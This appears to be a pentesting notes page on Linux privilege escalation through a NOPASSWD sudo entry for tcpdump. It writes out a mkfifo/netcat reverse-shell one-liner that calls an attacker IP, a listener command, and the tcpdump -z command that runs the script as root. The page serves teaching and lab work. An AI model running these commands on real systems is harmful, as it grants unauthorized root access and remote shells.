---
title: Sudo Rights Abuse
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Sudo Rights Abuse

When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in `/etc/sudoers`. Sometimes we will need to know the user's password to list their `sudo` rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

```
sudo -l
```


## tcpdump

For instance:

```shell-session
sudo -l
```

Output:
 
```
Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. 

For example, an attacker could create the shell script `.test` containing a reverse shell:

```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IPAttacker 1234 >/tmp/f
```

Then, we set a listener in the attacking machine:

```
nc -lvnp 1234
```

And then, run `tcpdump` as root with the `postrotate-command`.

```shell-session
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution.